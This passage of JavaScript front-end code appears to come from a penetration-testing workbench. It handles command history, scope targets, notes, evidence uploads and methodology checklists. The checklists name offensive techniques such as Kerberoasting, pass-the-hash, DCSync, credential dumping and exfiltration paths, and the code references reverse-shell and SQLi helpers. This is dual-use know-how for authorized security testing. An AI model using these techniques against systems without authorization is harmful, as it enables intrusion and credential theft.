                    <span class="text-slate-300 truncate flex-1">${escapeHtml(p.name)} <span class="text-slate-500">(${p.entries} entries)</span></span>
                    ${!p.downloaded ? `<button onclick="downloadPreset('${escapeAttr(p.id)}')" class="px-1.5 py-0.5 bg-blue-600/80 hover:bg-blue-500 text-white rounded text-xs transition-colors">Get</button>` : '<span class="text-emerald-400 text-xs">\u2713</span>'}
                </div>
            `).join('');
        }

        document.getElementById('wordlist-list').innerHTML = html || '<div class="text-slate-500 text-xs">No wordlists found</div>';
        if (typeof lucide !== 'undefined') lucide.createIcons();
    } catch(e) {
        document.getElementById('wordlist-list').innerHTML = '<div class="text-rose-400 text-xs">Failed to load</div>';
    }
}

async function downloadPreset(presetId) {
    try {
        await spectraApi.post(`/api/v1/wordlists/download-preset/${encodeURIComponent(presetId)}`);
        loadWordlists();
    } catch(e) { console.error(e); }
}

async function uploadWordlist(input) {
    const file = input.files?.[0];
    if (!file) return;
    const form = new FormData();
    form.append('file', file);
    try {
        await spectraApi.post('/api/v1/wordlists/upload', form);
        loadWordlists();
    } catch(e) { console.error(e); }
    input.value = '';
}

async function refreshWordlistOptions() {
    try {
        const { data } = await spectraApi.get('/api/v1/wordlists');
        const wordlists = data?.wordlists || data?.local || [];
        const dl = document.getElementById('wordlist-options');
        if (dl) {
            dl.innerHTML = wordlists.map(w => `<option value="${escapeAttr(w.path || w.name || w)}">`).join('');
        }
    } catch(e) { /* ignore */ }
}

// Init
document.addEventListener('DOMContentLoaded', () => {
    // Activate the initial tab via tabs.js so ARIA state is correct from the start
    if (window.activateTab) window.activateTab('manual-tabs', 'execute');
    loadTools();
    showTip();
    initRevShells();
    initEncoder();
    initPorts();
    loadWordlists();
    loadChecklist();
    loadNotes();
    loadEvidence();
    initLFI();
    initSQLi();
    initPrivEsc();
    renderADCommands();
    initEvidenceDragDrop();
    initClipboardPaste();
});

// ========== COMMAND HISTORY ==========
let commandHistory = JSON.parse(localStorage.getItem('spectra_cmd_history') || '[]');
let historySortKey = 'time';
let historySortAsc = false;

function addToHistory(entry) {
    commandHistory.unshift(entry);
    if (commandHistory.length > 200) commandHistory.pop();
    localStorage.setItem('spectra_cmd_history', JSON.stringify(commandHistory));
    renderHistory();
}

function renderHistory() {
    const search = (document.getElementById('history-search')?.value || '').toLowerCase();
    const toolFilter = document.getElementById('history-tool-filter')?.value || '';

    // Populate tool filter dropdown
    const toolSelect = document.getElementById('history-tool-filter');
    const tools = [...new Set(commandHistory.map(h => h.tool))];
    const currentVal = toolSelect.value;
    toolSelect.innerHTML = '<option value="">All tools</option>' + tools.map(t => `<option value="${escapeAttr(t)}">${escapeHtml(t)}</option>`).join('');
    toolSelect.value = currentVal;

    let filtered = commandHistory.filter(h => {
        if (toolFilter && h.tool !== toolFilter) return false;
        if (search && !h.tool.toLowerCase().includes(search) && !h.target.toLowerCase().includes(search) && !(h.output||'').toLowerCase().includes(search)) return false;
        return true;
    });

    // Sort
    filtered.sort((a, b) => {
        let va, vb;
        if (historySortKey === 'time') { va = new Date(a.time); vb = new Date(b.time); }
        else if (historySortKey === 'tool') { va = a.tool; vb = b.tool; }
        else if (historySortKey === 'status') { va = a.status ? 1 : 0; vb = b.status ? 1 : 0; }
        else if (historySortKey === 'duration') { va = a.duration; vb = b.duration; }
        else { va = a[historySortKey]; vb = b[historySortKey]; }
        if (va < vb) return historySortAsc ? -1 : 1;
        if (va > vb) return historySortAsc ? 1 : -1;
        return 0;
    });

    document.getElementById('history-list').innerHTML = filtered.slice(0, 50).map((h, i) => {
        const t = new Date(h.time);
        const timeStr = t.toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
        const statusIcon = h.status ? '<span class="text-emerald-400">&#10003;</span>' : '<span class="text-rose-400">&#10007;</span>';
        const dur = h.duration ? h.duration.toFixed(1) + 's' : '-';
        return `<tr class="border-b border-white/[0.03] hover:bg-white/[0.03] text-xs">
            <td class="px-3 py-1.5 text-slate-400 font-mono">${timeStr}</td>
            <td class="px-3 py-1.5 text-violet-400">${escapeHtml(h.tool)}</td>
            <td class="px-3 py-1.5 text-white font-mono truncate max-w-[150px]">${escapeHtml(h.target)}</td>
            <td class="px-3 py-1.5">${statusIcon}</td>
            <td class="px-3 py-1.5 text-slate-400 font-mono">${dur}</td>
            <td class="px-3 py-1.5 text-right">
                <button onclick="viewHistoryOutput(${i})" class="px-1.5 py-0.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-xs transition-colors mr-1">View</button>
                <button onclick="rerunFromHistory(${i})" class="px-1.5 py-0.5 bg-violet-600/60 hover:bg-violet-500 text-white rounded text-xs transition-colors">Re-run</button>
            </td>
        </tr>`;
    }).join('') || '<tr><td colspan="6" class="px-3 py-4 text-center text-slate-500 text-xs">No history yet</td></tr>';
}

function sortHistory(key) {
    if (historySortKey === key) historySortAsc = !historySortAsc;
    else { historySortKey = key; historySortAsc = true; }
    renderHistory();
}

function filterHistory() { renderHistory(); }

function toggleHistoryPanel() {
    const panel = document.getElementById('history-panel');
    const chevron = document.getElementById('history-chevron');
    panel.classList.toggle('hidden');
    chevron.classList.toggle('rotate-180');
    if (!panel.classList.contains('hidden')) renderHistory();
}

function viewHistoryOutput(idx) {
    const h = commandHistory[idx];
    if (!h) return;
    showModal('Output: ' + h.tool + ' → ' + h.target, `<pre class="text-xs text-slate-300 font-mono whitespace-pre-wrap p-4 max-h-[60vh] overflow-y-auto">${colorizeOutput(escapeHtml(h.output || '(no output)'))}</pre>` +
        (h.stderr ? `<pre class="text-xs text-amber-500/70 font-mono whitespace-pre-wrap p-4 border-t border-white/5">${escapeHtml(h.stderr)}</pre>` : ''));
}

function rerunFromHistory(idx) {
    const h = commandHistory[idx];
    if (!h) return;
    switchManualTab('execute');
    selectManualTool(h.toolId || h.tool.toLowerCase());
    setTimeout(() => {
        const targetInput = document.getElementById('arg-target');
        if (targetInput) targetInput.value = h.target;
        executeManualTool();
    }, 400);
}

// ========== DIFF MODAL ==========
function openDiffModal() {
    if (commandHistory.length < 2) { _spectraToast('Need at least 2 command runs to compare', 'warning'); return; }
    const options = commandHistory.slice(0, 50).map((h, i) => {
        const t = new Date(h.time).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit',second:'2-digit'});
        return `<option value="${i}">${t} - ${h.tool} → ${h.target}</option>`;
    }).join('');

    showModal('Compare Outputs', `
        <div class="p-4">
            <div class="flex gap-4 mb-4">
                <div class="flex-1"><label class="text-xs text-slate-500 uppercase font-bold">Left</label>
                    <select id="diff-left" class="w-full px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white focus:outline-none">${options}</select></div>
                <div class="flex-1"><label class="text-xs text-slate-500 uppercase font-bold">Right</label>
                    <select id="diff-right" class="w-full px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white focus:outline-none"><option value="1" selected>${commandHistory.length > 1 ? '' : ''}</option>${options}</select></div>
            </div>
            <button onclick="runDiff()" class="px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white rounded text-xs mb-3">Compare</button>
            <div id="diff-output" class="flex gap-2 max-h-[50vh] overflow-y-auto"></div>
        </div>`, 'max-w-5xl');
    if (commandHistory.length > 1) document.getElementById('diff-right').value = '1';
}

function runDiff() {
    const leftIdx = parseInt(document.getElementById('diff-left').value);
    const rightIdx = parseInt(document.getElementById('diff-right').value);
    const left = (commandHistory[leftIdx]?.output || '').split('\n');
    const right = (commandHistory[rightIdx]?.output || '').split('\n');

    const maxLen = Math.max(left.length, right.length);
    let leftHtml = '', rightHtml = '';
    for (let i = 0; i < maxLen; i++) {
        const l = left[i] || '';
        const r = right[i] || '';
        if (l === r) {
            leftHtml += `<div class="diff-unchanged px-2">${escapeHtml(l)}</div>`;
            rightHtml += `<div class="diff-unchanged px-2">${escapeHtml(r)}</div>`;
        } else {
            leftHtml += `<div class="diff-del px-2">${l ? '-' + escapeHtml(l) : '&nbsp;'}</div>`;
            rightHtml += `<div class="diff-add px-2">${r ? '+' + escapeHtml(r) : '&nbsp;'}</div>`;
        }
    }
    document.getElementById('diff-output').innerHTML = `
        <div class="flex-1 bg-black rounded-lg overflow-auto font-mono text-[11px] leading-5 p-2">${leftHtml}</div>
        <div class="flex-1 bg-black rounded-lg overflow-auto font-mono text-[11px] leading-5 p-2">${rightHtml}</div>`;
}

// ========== MODAL SYSTEM ==========
function showModal(title, content, widthClass) {
    const existing = document.getElementById('spectra-modal');
    if (existing) existing.remove();
    const modal = document.createElement('div');
    modal.id = 'spectra-modal';
    modal.className = 'modal-overlay';
    modal.onclick = (e) => { if (e.target === modal) modal.remove(); };
    modal.innerHTML = `<div class="modal-content ${widthClass || 'max-w-3xl'} w-full">
        <div class="flex items-center justify-between px-4 py-3 border-b border-white/10">
            <h3 class="text-sm font-bold text-white">${escapeHtml(title)}</h3>
            <button onclick="document.getElementById('spectra-modal').remove()" class="text-slate-400 hover:text-white"><i data-lucide="x" class="w-3.5 h-3.5 inline-block"></i></button>
        </div>
        <div>${content}</div>
    </div>`;
    document.body.appendChild(modal);
}

// ========== SCOPE MANAGEMENT ==========
let scopeTargets = JSON.parse(localStorage.getItem('spectra_scope_targets') || '[]');
let scopeExclusions = JSON.parse(localStorage.getItem('spectra_scope_exclusions') || '[]');

function toggleScopePanel() {
    document.getElementById('scope-panel').classList.toggle('open');
    renderScopeTargets();
    renderScopeExclusions();
}

function addScopeTarget() {
    const type = document.getElementById('scope-target-type').value;
    const value = document.getElementById('scope-target-value').value.trim();
    const notes = document.getElementById('scope-target-notes').value.trim();
    if (!value) return;
    scopeTargets.push({type, value, notes});
    localStorage.setItem('spectra_scope_targets', JSON.stringify(scopeTargets));
    document.getElementById('scope-target-value').value = '';
    document.getElementById('scope-target-notes').value = '';
    renderScopeTargets();
}

function removeScopeTarget(idx) {
    scopeTargets.splice(idx, 1);
    localStorage.setItem('spectra_scope_targets', JSON.stringify(scopeTargets));
    renderScopeTargets();
}

function renderScopeTargets() {
    const icons = {ip:'network', domain:'globe', url:'link'};
    document.getElementById('scope-targets-list').innerHTML = scopeTargets.map((t, i) =>
        `<div class="flex items-center gap-2 text-xs px-2 py-1.5 rounded bg-white/[0.02]">
            <i data-lucide="${icons[t.type] || 'circle'}" class="w-3.5 h-3.5 inline-block ${t.type === 'ip' ? 'text-blue-400' : t.type === 'domain' ? 'text-emerald-400' : t.type === 'url' ? 'text-violet-400' : 'text-slate-400'}"></i>
            <span class="text-xs text-slate-500 uppercase w-12">${t.type}</span>
            <span class="text-white font-mono flex-1 truncate">${escapeHtml(t.value)}</span>
            <span class="text-slate-500 text-xs truncate max-w-[100px]">${escapeHtml(t.notes)}</span>
            <button onclick="removeScopeTarget(${i})" class="text-slate-600 hover:text-rose-400 transition-colors"><i data-lucide="x" class="w-3.5 h-3.5 inline-block"></i></button>
        </div>`
    ).join('') || '<div class="text-slate-500 text-xs py-1">No targets defined</div>';
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function addScopeExclusion() {
    const type = document.getElementById('scope-excl-type').value;
    const value = document.getElementById('scope-excl-value').value.trim();
    const reason = document.getElementById('scope-excl-reason').value.trim();
    if (!value) return;
    scopeExclusions.push({type, value, reason});
    localStorage.setItem('spectra_scope_exclusions', JSON.stringify(scopeExclusions));
    document.getElementById('scope-excl-value').value = '';
    document.getElementById('scope-excl-reason').value = '';
    renderScopeExclusions();
}

function removeScopeExclusion(idx) {
    scopeExclusions.splice(idx, 1);
    localStorage.setItem('spectra_scope_exclusions', JSON.stringify(scopeExclusions));
    renderScopeExclusions();
}

function renderScopeExclusions() {
    document.getElementById('scope-exclusions-list').innerHTML = scopeExclusions.map((e, i) =>
        `<div class="flex items-center gap-2 text-xs px-2 py-1.5 rounded bg-rose-500/5">
            <i data-lucide="ban" class="w-3.5 h-3.5 inline-block text-rose-400"></i>
            <span class="text-xs text-slate-500 uppercase w-12">${e.type}</span>
            <span class="text-rose-300 font-mono flex-1 truncate">${escapeHtml(e.value)}</span>
            <span class="text-slate-500 text-xs truncate max-w-[100px]">${escapeHtml(e.reason)}</span>
            <button onclick="removeScopeExclusion(${i})" class="text-slate-600 hover:text-rose-400 transition-colors"><i data-lucide="x" class="w-3.5 h-3.5 inline-block"></i></button>
        </div>`
    ).join('') || '<div class="text-slate-500 text-xs py-1">No exclusions defined</div>';
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function saveScope() {
    localStorage.setItem('spectra_scope_roe', document.getElementById('scope-roe').value);
    _spectraToast('Scope saved to session', 'success');
}

// ========== CHECKLISTS ==========
const CHECKLIST_DATA = {
    owasp: {name:'OWASP Top 10', categories: [
        {name:'A01: Broken Access Control', items:['Test horizontal privilege escalation','Test vertical privilege escalation','Test IDOR vulnerabilities','Test missing function level access control','Check CORS misconfiguration','Test directory traversal','Verify JWT token validation']},
        {name:'A02: Cryptographic Failures', items:['Check for sensitive data in transit (TLS)','Check for weak cipher suites','Test for sensitive data exposure in URLs','Check password storage (hashing algorithm)','Test for insecure cookies (Secure/HttpOnly flags)']},
        {name:'A03: Injection', items:['Test SQL injection (all input fields)','Test NoSQL injection','Test LDAP injection','Test OS command injection','Test XSS (reflected, stored, DOM-based)','Test template injection (SSTI)','Test header injection']},
        {name:'A04: Insecure Design', items:['Review authentication flow','Test rate limiting','Check for insecure direct object references','Review business logic flaws','Test for race conditions']},
        {name:'A05: Security Misconfiguration', items:['Check default credentials','Review HTTP security headers','Test for directory listing','Check error handling (stack traces)','Review CORS policy','Test for unnecessary HTTP methods','Check for debug mode/endpoints']},
        {name:'A06: Vulnerable Components', items:['Identify all frameworks/libraries','Check for known CVEs in dependencies','Test for outdated software versions','Review third-party integrations']},
        {name:'A07: Auth Failures', items:['Test brute force protection','Test password policy enforcement','Test session management','Test multi-factor authentication bypass','Check session timeout/fixation','Test logout functionality','Test remember me functionality']},
        {name:'A08: Data Integrity', items:['Check for insecure deserialization','Verify software update mechanisms','Test CI/CD pipeline security','Check for unsigned/unverified data']},
        {name:'A09: Logging & Monitoring', items:['Verify security events are logged','Check log injection prevention','Test alerting mechanisms','Review log retention policy']},
        {name:'A10: SSRF', items:['Test for SSRF in URL parameters','Test for SSRF in file upload','Test for SSRF via webhooks','Check for internal service enumeration']},
    ]},
    network: {name:'Network Pentest', categories: [
        {name:'Reconnaissance', items:['DNS enumeration','Subdomain discovery','Port scanning (TCP full)','Port scanning (UDP top 100)','Service version detection','OS fingerprinting','SNMP enumeration','SMB enumeration']},
        {name:'Vulnerability Assessment', items:['Run Nuclei templates','Run Nessus/OpenVAS scan','Check for default credentials','Test SSL/TLS configuration','Check for known CVEs','Test for misconfigurations']},
        {name:'Exploitation', items:['Attempt default credential login','Test for known exploits (searchsploit)','Test for buffer overflows','SQL injection on web services','Test for command injection']},
        {name:'Post-Exploitation', items:['Escalate privileges','Dump credentials/hashes','Lateral movement','Persistence mechanisms','Data exfiltration paths','Clean up artifacts']},
    ]},
    api: {name:'API Security', categories: [
        {name:'Authentication', items:['Test API key security','Test OAuth flow','Test JWT implementation','Test rate limiting on auth endpoints','Test password reset flow','Check for broken authentication']},
        {name:'Authorization', items:['Test BOLA/IDOR','Test broken function level auth','Test object property level auth','Test mass assignment','Test for privilege escalation']},
        {name:'Input Validation', items:['Test for injection (SQL, NoSQL, command)','Test for XSS in API responses','Test request size limits','Test content-type validation','Test for XXE in XML parsers']},
        {name:'Data Exposure', items:['Check for excessive data exposure','Review error messages','Check for sensitive data in logs','Test for information disclosure in headers']},
    ]},
    ad: {name:'Active Directory', categories: [
        {name:'Initial Enumeration', items:['Enumerate domain controllers','Enumerate domain users','Enumerate domain groups','Enumerate GPOs','Check for null sessions','Enumerate shares','Check for AS-REP roastable accounts']},
        {name:'Credential Attacks', items:['Kerberoasting','AS-REP Roasting','Password spraying','NTLM relay','Pass the hash','Pass the ticket','Golden ticket','Silver ticket']},
        {name:'Privilege Escalation', items:['Check for misconfigured ACLs','Check for unconstrained delegation','Check for constrained delegation','Abuse GenericAll/GenericWrite','Abuse Group Policy','Check for LAPS','DCSync attack']},
        {name:'Lateral Movement', items:['PSExec','WMI execution','WinRM','DCOM execution','RDP hijacking','Named pipe impersonation']},
    ]},
    ptes: {name:'PTES', categories: [
        {name:'Pre-engagement', items:['Define scope','Get written authorization','Establish communication channels','Define rules of engagement','Emergency contacts']},
        {name:'Intelligence Gathering', items:['OSINT reconnaissance','Active DNS enumeration','Email harvesting','Technology fingerprinting','Social media review']},
        {name:'Threat Modeling', items:['Identify assets','Identify threat actors','Map attack surface','Prioritize attack vectors']},
        {name:'Vulnerability Analysis', items:['Automated scanning','Manual verification','Research public exploits','False positive elimination']},
        {name:'Exploitation', items:['Exploit identified vulnerabilities','Confirm impact','Document exploitation steps','Capture evidence']},
        {name:'Post-Exploitation', items:['Privilege escalation','Lateral movement','Data access assessment','Persistence testing']},
        {name:'Reporting', items:['Executive summary','Technical findings','Remediation recommendations','Evidence compilation']},
    ]},
};

let checklistState = {};

function loadChecklist() {
    const method = document.getElementById('checklist-methodology').value;
    const data = CHECKLIST_DATA[method];
    if (!data) return;

    const stateKey = 'spectra_checklist_' + method;
    checklistState = JSON.parse(localStorage.getItem(stateKey) || '{}');

    const container = document.getElementById('checklist-content');
    container.innerHTML = data.categories.map((cat, ci) => {
        const completed = cat.items.filter((_, ii) => checklistState[ci + '-' + ii]).length;
        return `<div class="border border-white/5 rounded-lg overflow-hidden">
            <button onclick="toggleAccordion(this)" class="w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800 text-left transition-colors">
                <span class="text-sm font-medium text-white">${escapeHtml(cat.name)}</span>
                <span class="flex items-center gap-2">
                    <span class="text-xs text-slate-500">${completed}/${cat.items.length}</span>
                    <i data-lucide="chevron-down" class="w-3.5 h-3.5 inline-block text-slate-500 transition-transform"></i>
                </span>
            </button>
            <div class="accordion-content${ci === 0 ? ' open' : ''}">
                <div class="p-3 space-y-1">
                    ${cat.items.map((item, ii) => {
                        const key = ci + '-' + ii;
                        const checked = checklistState[key];
                        const toolMatches = item.match(/\b(nmap|nuclei|nikto|gobuster|sqlmap|hydra|searchsploit|whatweb|wpscan|feroxbuster|dirsearch|ffuf|crackmapexec|enum4linux|impacket|kerbrute|testssl)\b/gi) || [];
                        const toolBadges = toolMatches.map(t => `<button onclick="event.stopPropagation();jumpToTool('${t.toLowerCase()}')" class="px-1.5 py-0.5 bg-violet-500/10 hover:bg-violet-500/20 text-violet-400 rounded text-xs transition-colors">${t}</button>`).join('');
                        return `<div class="checklist-item ${checked ? 'completed' : ''} flex items-start gap-2 px-2 py-1.5 rounded hover:bg-white/[0.03] group">
                            <input type="checkbox" ${checked ? 'checked' : ''} onchange="toggleChecklistItem('${method}','${key}',this)" class="mt-0.5 accent-emerald-500 shrink-0">
                            <span class="checklist-text text-xs text-slate-200 flex-1">${escapeHtml(item)}</span>
                            <div class="flex gap-1 shrink-0">${toolBadges}</div>
                            <button onclick="toggleChecklistNotes(this)" class="text-slate-600 hover:text-slate-400 text-xs opacity-0 group-hover:opacity-100 transition-opacity shrink-0" title="Notes"><i data-lucide="sticky-note" class="w-3.5 h-3.5 inline-block"></i></button>
                        </div>
                        <div class="checklist-notes hidden px-8 pb-1">
                            <textarea placeholder="Notes..." rows="2" class="w-full px-2 py-1 bg-slate-900/60 border border-white/10 rounded text-[11px] text-white placeholder-slate-600 focus:outline-none resize-none" oninput="saveChecklistNote('${method}','${key}-note',this.value)">${escapeHtml(checklistState[key + '-note'] || '')}</textarea>
                        </div>`;
                    }).join('')}
                </div>
            </div>
        </div>`;
    }).join('');
    updateChecklistProgress(method);
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function toggleAccordion(btn) {
    const content = btn.nextElementSibling;
    content.classList.toggle('open');
    btn.querySelector('i').classList.toggle('rotate-180');
}

function toggleChecklistItem(method, key, checkbox) {
    const stateKey = 'spectra_checklist_' + method;
    checklistState[key] = checkbox.checked;
    localStorage.setItem(stateKey, JSON.stringify(checklistState));
    checkbox.closest('.checklist-item').classList.toggle('completed', checkbox.checked);
    updateChecklistProgress(method);
}

function toggleChecklistNotes(btn) {
    btn.closest('.checklist-item').nextElementSibling.classList.toggle('hidden');
}

function saveChecklistNote(method, key, value) {
    const stateKey = 'spectra_checklist_' + method;
    checklistState[key] = value;
    localStorage.setItem(stateKey, JSON.stringify(checklistState));
}

function updateChecklistProgress(method) {
    const data = CHECKLIST_DATA[method];
    if (!data) return;
    let total = 0, done = 0;
    data.categories.forEach((cat, ci) => {
        cat.items.forEach((_, ii) => {
            total++;
            if (checklistState[ci + '-' + ii]) done++;
        });
    });
    const pct = total ? Math.round((done / total) * 100) : 0;
    document.getElementById('checklist-progress-bar').style.width = pct + '%';
    document.getElementById('checklist-progress-text').textContent = `${done}/${total} completed (${pct}%)`;
}

function resetChecklist() {
    _spectraConfirm('Reset all checklist progress?', () => {
        const method = document.getElementById('checklist-methodology').value;
        checklistState = {};
        localStorage.removeItem('spectra_checklist_' + method);
        loadChecklist();
    }, { title: 'Reset Checklist' });
}

// ========== NOTES ==========
let notesData = JSON.parse(localStorage.getItem('spectra_notes') || '[]');
let activeNoteId = null;
let noteAutoSaveTimer = null;

function loadNotes() { renderNotesList(); }

function createNote() {
    const note = { id: Date.now().toString(), title: 'Untitled Note', content: '', target_id: '', finding_id: '', updated: new Date().toISOString() };
    notesData.unshift(note);
    saveNotesToStorage();
    activeNoteId = note.id;
    renderNotesList();
    showNoteEditor(note);
}

function renderNotesList() {
    const filter = document.getElementById('notes-filter')?.value || 'all';
    let filtered = notesData;
    if (filter === 'target') filtered = notesData.filter(n => n.target_id);
    if (filter === 'finding') filtered = notesData.filter(n => n.finding_id);

    const list = document.getElementById('notes-list');
    if (!filtered.length) {
        list.innerHTML = '<div class="text-slate-500 text-xs text-center py-4">No notes yet</div>';
        return;
    }
    list.innerHTML = filtered.map(n => {
        const active = n.id === activeNoteId ? 'note-item active' : '';
        const date = new Date(n.updated).toLocaleDateString([], {month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
        return `<div class="${active} border border-white/5 rounded-lg p-2 cursor-pointer hover:bg-white/[0.03] transition-colors" onclick="openNote('${n.id}')">
            <div class="text-xs text-white font-medium truncate">${escapeHtml(n.title || 'Untitled')}</div>
            <div class="text-xs text-slate-500">${date}</div>
        </div>`;
    }).join('');
}

function filterNotes() { renderNotesList(); }

function openNote(id) {
    const note = notesData.find(n => n.id === id);
    if (!note) return;
    activeNoteId = id;
    renderNotesList();
    showNoteEditor(note);
}

function showNoteEditor(note) {
    document.getElementById('notes-editor-empty').classList.add('hidden');
    document.getElementById('notes-editor').classList.remove('hidden');
    document.getElementById('note-title').value = note.title || '';
    document.getElementById('note-content').value = note.content || '';
    document.getElementById('note-target').value = note.target_id || '';
    document.getElementById('note-finding').value = note.finding_id || '';
    document.getElementById('note-autosave-status').textContent = '';
    // Show edit mode
    document.getElementById('note-content').classList.remove('hidden');
    document.getElementById('note-preview').classList.add('hidden');
    document.getElementById('note-preview-toggle').innerHTML = '<i data-lucide="eye" class="w-3.5 h-3.5 inline-block mr-1"></i>Preview';
}

function onNoteEdit() {
    clearTimeout(noteAutoSaveTimer);
    document.getElementById('note-autosave-status').textContent = 'Unsaved changes...';
    noteAutoSaveTimer = setTimeout(() => { saveCurrentNote(); }, 2000);
}

function saveCurrentNote() {
    if (!activeNoteId) return;
    const note = notesData.find(n => n.id === activeNoteId);
    if (!note) return;
    note.title = document.getElementById('note-title').value;
    note.content = document.getElementById('note-content').value;
    note.target_id = document.getElementById('note-target').value;
    note.finding_id = document.getElementById('note-finding').value;
    note.updated = new Date().toISOString();
    saveNotesToStorage();
    document.getElementById('note-autosave-status').textContent = 'Saved';
    renderNotesList();
}

function deleteNote() {
    if (!activeNoteId) return;
    _spectraConfirm('Delete this note?', () => {
        notesData = notesData.filter(n => n.id !== activeNoteId);
        saveNotesToStorage();
        activeNoteId = null;
        document.getElementById('notes-editor').classList.add('hidden');
        document.getElementById('notes-editor-empty').classList.remove('hidden');
        renderNotesList();
    }, { title: 'Delete Note' });
}

function saveNotesToStorage() {
    localStorage.setItem('spectra_notes', JSON.stringify(notesData));
}

function wrapNoteText(before, after) {
    const ta = document.getElementById('note-content');
    const start = ta.selectionStart, end = ta.selectionEnd;
    const text = ta.value;
    const selected = text.substring(start, end) || 'text';
    ta.value = text.substring(0, start) + before + selected + after + text.substring(end);
    ta.selectionStart = start + before.length;
    ta.selectionEnd = start + before.length + selected.length;
    ta.focus();
    onNoteEdit();
}

function toggleNotePreview() {
    const content = document.getElementById('note-content');
    const preview = document.getElementById('note-preview');
    const toggle = document.getElementById('note-preview-toggle');
    if (content.classList.contains('hidden')) {
        content.classList.remove('hidden');
        preview.classList.add('hidden');
        toggle.innerHTML = '<i data-lucide="eye" class="w-3.5 h-3.5 inline-block mr-1"></i>Preview';
    } else {
        content.classList.add('hidden');
        preview.classList.remove('hidden');
        toggle.innerHTML = '<i data-lucide="edit" class="w-3.5 h-3.5 inline-block mr-1"></i>Edit';
        preview.innerHTML = renderMarkdown(content.value);
    }
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function renderMarkdown(text) {
    return escapeHtml(text)
        .replace(/^### (.+)$/gm, '<h3 class="text-base font-bold text-white mt-2 mb-1">$1</h3>')
        .replace(/^## (.+)$/gm, '<h2 class="text-lg font-bold text-white mt-3 mb-1">$1</h2>')
        .replace(/^# (.+)$/gm, '<h1 class="text-xl font-bold text-white mt-4 mb-2">$1</h1>')
        .replace(/\*\*(.+?)\*\*/g, '<strong class="text-white">$1</strong>')
        .replace(/\*(.+?)\*/g, '<em>$1</em>')
        .replace(/`(.+?)`/g, '<code class="px-1 py-0.5 bg-black/30 rounded text-violet-300 text-xs font-mono">$1</code>')
        .replace(/\[(.+?)\]\((.+?)\)/g, '<a href="$2" class="text-violet-400 underline" target="_blank">$1</a>')
        .replace(/^- (.+)$/gm, '<li class="ml-4 list-disc">$1</li>')
        .replace(/\n/g, '<br>');
}

// ========== EVIDENCE ==========
let evidenceFiles = JSON.parse(localStorage.getItem('spectra_evidence') || '[]');

function loadEvidence() { renderEvidenceGrid(); }

function renderEvidenceGrid() {
    const findingFilter = document.getElementById('evidence-finding-filter')?.value || '';
    let filtered = evidenceFiles;
    if (findingFilter) filtered = filtered.filter(e => e.finding_id === findingFilter);

    const grid = document.getElementById('evidence-grid');
    if (!filtered.length) {
        grid.innerHTML = '<div class="text-slate-500 text-sm text-center py-8 col-span-full">No evidence files yet. Upload or paste screenshots.</div>';
        return;
    }
    grid.innerHTML = filtered.map((e, i) => {
        const isImage = /\.(png|jpg|jpeg|gif|webp|svg)$/i.test(e.name) || e.type?.startsWith('image/');
        const thumb = isImage && e.dataUrl
            ? `<img src="${e.dataUrl}" class="w-full h-32 object-cover rounded-t-lg" alt="${escapeHtml(e.name)}">`
            : `<div class="w-full h-32 flex items-center justify-center bg-slate-800 rounded-t-lg"><i data-lucide="file" class="w-8 h-8 inline-block text-slate-500"></i></div>`;
        const size = e.size ? formatFileSize(e.size) : '-';
        const ago = e.uploaded ? timeAgo(new Date(e.uploaded)) : '';
        return `<div class="evidence-card rounded-lg bg-slate-800/50 cursor-pointer" onclick="previewEvidence(${i})">
            ${thumb}
            <div class="p-2">
                <div class="text-xs text-white truncate">${escapeHtml(e.name)}</div>
                <div class="text-xs text-slate-500">${size} - ${ago}</div>
            </div>
            <button onclick="event.stopPropagation();removeEvidence(${i})" class="absolute top-1 right-1 w-5 h-5 bg-black/50 hover:bg-rose-600 text-white rounded-full text-xs flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity"><i data-lucide="x" class="w-3.5 h-3.5 inline-block"></i></button>
        </div>`;
    }).join('');
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function uploadEvidence(input) {
    Array.from(input.files).forEach(file => {
        const reader = new FileReader();
        reader.onload = () => {
            evidenceFiles.push({ name: file.name, type: file.type, size: file.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
            localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
            renderEvidenceGrid();
        };
        reader.readAsDataURL(file);
    });
    input.value = '';
}

async function pasteEvidence() {
    try {
        const items = await navigator.clipboard.read();
        for (const item of items) {
            for (const type of item.types) {
                if (type.startsWith('image/')) {
                    const blob = await item.getType(type);
                    const reader = new FileReader();
                    reader.onload = () => {
                        const name = 'clipboard-' + Date.now() + '.' + type.split('/')[1];
                        evidenceFiles.push({ name, type, size: blob.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
                        localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
                        renderEvidenceGrid();
                    };
                    reader.readAsDataURL(blob);
                }
            }
        }
    } catch (e) { console.debug('Clipboard read failed:', e); }
}

function initEvidenceDragDrop() {
    const dropzone = document.getElementById('evidence-dropzone');
    const panel = document.getElementById('panel-evidence');
    if (!panel) return;
    panel.addEventListener('dragenter', (e) => { e.preventDefault(); dropzone.classList.remove('hidden'); dropzone.classList.add('dragover'); });
    dropzone.addEventListener('dragleave', () => { dropzone.classList.add('hidden'); dropzone.classList.remove('dragover'); });
    dropzone.addEventListener('dragover', (e) => e.preventDefault());
    dropzone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropzone.classList.add('hidden');
        dropzone.classList.remove('dragover');
        Array.from(e.dataTransfer.files).forEach(file => {
            const reader = new FileReader();
            reader.onload = () => {
                evidenceFiles.push({ name: file.name, type: file.type, size: file.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
                localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
                renderEvidenceGrid();
            };
            reader.readAsDataURL(file);
        });
    });
}

function initClipboardPaste() {
